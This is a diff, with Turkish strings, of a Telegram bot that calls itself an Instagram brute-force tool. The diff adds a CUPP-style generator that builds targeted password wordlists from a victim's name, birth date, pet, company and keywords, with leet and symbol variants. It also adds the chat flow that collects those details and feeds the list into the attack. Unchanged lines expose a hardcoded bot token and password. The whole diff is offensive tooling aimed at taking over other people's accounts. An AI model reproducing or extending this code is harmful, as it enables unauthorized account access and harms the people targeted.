@@ -35,6 +35,94 @@ TOKEN = "6481633238:AAHMT8V8nHNUsQUm69F1ngczdiFTzJAQJfU"
 # Güvenlik şifresi
 BOT_PASSWORD = "vio1911"
 
+# CUPP tarzı şifre oluşturucu için yapılandırma
+class PasswordGenerator:
+    def __init__(self):
+        self.config = {
+            "chars": ['!', '@', '#', '$', '%', '&', '*', '(', ')', '-', '+', '=', '?'],
+            "years": [str(year) for year in range(1980, 2026)],
+            "numfrom": 0,
+            "numto": 100
+        }
+        self.leet_rules = {
+            'a': ['@', '4'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'],
+            's': ['5', '$'], 't': ['7'], 'l': ['1'], 'b': ['8']
+        }
+
+    def generate_wordlist(self, profile: dict) -> List[str]:
+        wordlist = []
+        firstname = profile.get("firstname", "").lower()
+        lastname = profile.get("lastname", "").lower()
+        birthdate = profile.get("birthdate", "").replace("/", "")
+        pet = profile.get("pet", "").lower()
+        company = profile.get("company", "").lower()
+        keywords = profile.get("keywords", [])
+
+        # Temel kelimeler
+        base_words = [word for word in [firstname, lastname, pet, company] if word]
+        base_words.extend(keywords)
+
+        # Doğum tarihi varyasyonları
+        birthdate_formats = []
+        if birthdate and len(birthdate) == 8:
+            dd, mm, yyyy = birthdate[:2], birthdate[2:4], birthdate[4:]
+            birthdate_formats.extend([dd, mm, yyyy, yyyy[-2:], yyyy[-3:], f"{dd}{mm}", f"{mm}{dd}", f"{dd}{yyyy}", f"{mm}{yyyy}"])
+
+        # Kelime kombinasyonları
+        for word in base_words:
+            wordlist.append(word)
+            wordlist.append(word.capitalize())
+            for year in birthdate_formats + self.config["years"]:
+                wordlist.append(f"{word}{year}")
+                wordlist.append(f"{year}{word}")
+            for num in range(self.config["numfrom"], self.config["numto"] + 1):
+                wordlist.append(f"{word}{num:02d}")
+                wordlist.append(f"{num:02d}{word}")
+
+        # Çift kelime kombinasyonları
+        for w1, w2 in itertools.combinations(base_words, 2):
+            wordlist.append(f"{w1}{w2}")
+            wordlist.append(f"{w2}{w1}")
+            wordlist.append(f"{w1.capitalize()}{w2.capitalize()}")
+            for year in birthdate_formats + self.config["years"]:
+                wordlist.append(f"{w1}{w2}{year}")
+                wordlist.append(f"{w2}{w1}{year}")
+
+        # Leet mode
+        if profile.get("leetmode", False):
+            leet_words = []
+            for word in wordlist[:]:
+                leet_variations = [word]
+                for char, replacements in self.leet_rules.items():
+                    new_variations = []
+                    for var in leet_variations:
+                        if char in var.lower():
+                            for repl in replacements:
+                                new_variations.append(var.replace(char, repl).replace(char.upper(), repl))
+                    leet_variations.extend(new_variations)
+                leet_words.extend(leet_variations)
+            wordlist.extend(leet_words)
+
+        # Özel karakterler
+        if profile.get("spechars", False):
+            special_words = []
+            for word in wordlist[:]:
+                for char in self.config["chars"]:
+                    special_words.append(f"{word}{char}")
+                    for char2 in self.config["chars"]:
+                        special_words.append(f"{word}{char}{char2}")
+            wordlist.extend(special_words)
+
+        # Rastgele sayılar
+        if profile.get("randnum", False):
+            numbered_words = []
+            for word in wordlist[:]:
+                for num in range(self.config["numfrom"], self.config["numto"] + 1):
+                    numbered_words.append(f"{word}{num:02d}")
+            wordlist.extend(numbered_words)
+
+        return list(set(wordlist))  # Tekrar edenleri kaldır
+
 class InstagramBruteForce:
     """Instagram brute-force işlemleri için sınıf - 2025 güncel versiyon."""
     
@@ -480,6 +568,7 @@ class TelegramBot:
     def __init__(self):
         self.user_data = {}
         self.brute_force_tasks = {}
+        self.password_generator = PasswordGenerator()
 
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
@@ -489,7 +578,17 @@ class TelegramBot:
     async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
         if user_id not in self.user_data:
-            self.user_data[user_id] = {'username': None, 'password_file': None, 'proxy_file': None, 'timeout': 1800}
+            self.user_data[user_id] = {
+                'username': None,
+                'password_file': None,
+                'proxy_file': None,
+                'timeout': 1800,
+                'password_profile': {
+                    'firstname': '', 'lastname': '', 'birthdate': '',
+                    'pet': '', 'company': '', 'keywords': [],
+                    'leetmode': False, 'spechars': False, 'randnum': False
+                }
+            }
 
         awaiting = context.user_data.get('awaiting')
         if not awaiting:
@@ -499,7 +598,6 @@ class TelegramBot:
             entered_password = update.message.text.strip()
             if entered_password == BOT_PASSWORD:
                 context.user_data['awaiting'] = None
-                self.user_data[user_id] = {'username': None, 'password_file': None, 'proxy_file': None, 'timeout': 1800}
                 welcome_message = (
                     "👾 **HACKER V3.0 AKTİF!** 👾\n"
                     "🔥 Instagram Brute Force Botuna Hoş Geldin! 🔥\n"
@@ -510,6 +608,7 @@ class TelegramBot:
                 keyboard = [
                     [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
                     [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
+                    [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
                     [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
                     [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
                     [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')]
@@ -553,11 +652,51 @@ class TelegramBot:
             except ValueError:
                 await update.message.reply_text("❌ Lütfen geçerli bir sayı gir!")
             return
+        elif awaiting == 'generate_firstname':
+            self.user_data[user_id]['password_profile']['firstname'] = update.message.text.strip()
+            await update.message.reply_text("📝 Soyadı gir (boş bırakmak için Enter):")
+            context.user_data['awaiting'] = 'generate_lastname'
+            return
+        elif awaiting == 'generate_lastname':
+            self.user_data[user_id]['password_profile']['lastname'] = update.message.text.strip()
+            await update.message.reply_text("📝 Doğum tarihi gir (DDMMYYYY, ör: 05071978, boş bırakmak için Enter):")
+            context.user_data['awaiting'] = 'generate_birthdate'
+            return
+        elif awaiting == 'generate_birthdate':
+            birthdate = update.message.text.strip()
+            if birthdate and (len(birthdate) != 8 or not birthdate.isdigit()):
+                await update.message.reply_text("❌ Doğum tarihi 8 haneli olmalı (DDMMYYYY)! Tekrar dene:")
+                return
+            self.user_data[user_id]['password_profile']['birthdate'] = birthdate
+            await update.message.reply_text("📝 Evcil hayvan adı gir (boş bırakmak için Enter):")
+            context.user_data['awaiting'] = 'generate_pet'
+            return
+        elif awaiting == 'generate_pet':
+            self.user_data[user_id]['password_profile']['pet'] = update.message.text.strip()
+            await update.message.reply_text("📝 Şirket adı gir (boş bırakmak için Enter):")
+            context.user_data['awaiting'] = 'generate_company'
+            return
+        elif awaiting == 'generate_company':
+            self.user_data[user_id]['password_profile']['company'] = update.message.text.strip()
+            await update.message.reply_text("📝 Ek anahtar kelimeler gir (virgülle ayır, ör: hacker,juice, boş bırakmak için Enter):")
+            context.user_data['awaiting'] = 'generate_keywords'
+            return
+        elif awaiting == 'generate_keywords':
+            keywords = update.message.text.strip()
+            self.user_data[user_id]['password_profile']['keywords'] = [k.strip() for k in keywords.split(',') if k.strip()] if keywords else []
+            keyboard = [
+                [InlineKeyboardButton("Evet", callback_data='leet_yes'), InlineKeyboardButton("Hayır", callback_data='leet_no')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await update.message.reply_text("🔢 Leet mode? (ör: leet → 1337)", reply_markup=reply_markup)
+            context.user_data['awaiting'] = 'generate_leet'
+            return
 
         context.user_data['awaiting'] = None
         keyboard = [
             [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
             [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
+            [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
             [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
             [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
             [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')]
@@ -582,8 +721,68 @@ class TelegramBot:
         elif query.data == 'set_timeout':
             await query.message.reply_text("⏰ Lütfen timeout süresini (saniye) gir (60-7200 arası):")
             context.user_data['awaiting'] = 'timeout'
+        elif query.data == 'generate_password_list':
+            await query.message.reply_text("🔑 Şifre listesi oluşturmak için bilgileri gir. Adı gir (boş bırakmak için Enter):")
+            context.user_data['awaiting'] = 'generate_firstname'
+        elif query.data == 'leet_yes':
+            self.user_data[user_id]['password_profile']['leetmode'] = True
+            keyboard = [
+                [InlineKeyboardButton("Evet", callback_data='spechars_yes'), InlineKeyboardButton("Hayır", callback_data='spechars_no')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.message.reply_text("🔣 Özel karakterler eklemek ister misiniz? (ör: !, @, #)", reply_markup=reply_markup)
+            context.user_data['awaiting'] = 'generate_spechars'
+        elif query.data == 'leet_no':
+            self.user_data[user_id]['password_profile']['leetmode'] = False
+            keyboard = [
+                [InlineKeyboardButton("Evet", callback_data='spechars_yes'), InlineKeyboardButton("Hayır", callback_data='spechars_no')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.message.reply_text("🔣 Özel karakterler eklemek ister misiniz? (ör: !, @, #)", reply_markup=reply_markup)
+            context.user_data['awaiting'] = 'generate_spechars'
+        elif query.data == 'spechars_yes':
+            self.user_data[user_id]['password_profile']['spechars'] = True
+            keyboard = [
+                [InlineKeyboardButton("Evet", callback_data='randnum_yes'), InlineKeyboardButton("Hayır", callback_data='randnum_no')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.message.reply_text("🔢 Rastgele sayılar eklemek ister misiniz? (ör: 01, 99)", reply_markup=reply_markup)
+            context.user_data['awaiting'] = 'generate_randnum'
+        elif query.data == 'spechars_no':
+            self.user_data[user_id]['password_profile']['spechars'] = False
+            keyboard = [
+                [InlineKeyboardButton("Evet", callback_data='randnum_yes'), InlineKeyboardButton("Hayır", callback_data='randnum_no')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.message.reply_text("🔢 Rastgele sayılar eklemek ister misiniz? (ör: 01, 99)", reply_markup=reply_markup)
+            context.user_data['awaiting'] = 'generate_randnum'
+        elif query.data == 'randnum_yes':
+            self.user_data[user_id]['password_profile']['randnum'] = True
+            await self.generate_password_file(query, user_id)
+        elif query.data == 'randnum_no':
+            self.user_data[user_id]['password_profile']['randnum'] = False
+            await self.generate_password_file(query, user_id)
         elif query.data == 'start_attack':
             await self.start_attack(update, context)
+
+    async def generate_password_file(self, query: Update, user_id: int):
+        profile = self.user_data[user_id]['password_profile']
+        wordlist = self.password_generator.generate_wordlist(profile)
+        file_path = f"passwords_{user_id}.txt"
+        with open(file_path, 'w', encoding='utf-8') as f:
+            f.write('\n'.join(wordlist))
+        self.user_data[user_id]['password_file'] = file_path
+        await query.message.reply_text(f"✅ Şifre listesi oluşturuldu! {len(wordlist)} şifre kaydedildi: {file_path}")
+        keyboard = [
+            [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
+            [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
+            [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
+            [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
+            [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
+            [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.message.reply_text("➡️ Başka ne yapmak istersin?", reply_markup=reply_markup)
 
     async def start_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
@@ -599,7 +798,7 @@ class TelegramBot:
             await query.message.reply_text("❌ Lütfen önce kullanıcı adı gir!")
             return
         if not self.user_data[user_id]['password_file'] or not os.path.exists(self.user_data[user_id]['password_file']):
-            await query.message.reply_text("❌ Lütfen geçerli bir şifre listesi yükle!")
+            await query.message.reply_text("❌ Lütfen geçerli bir şifre listesi yükle veya oluştur!")
             return
 
         try:
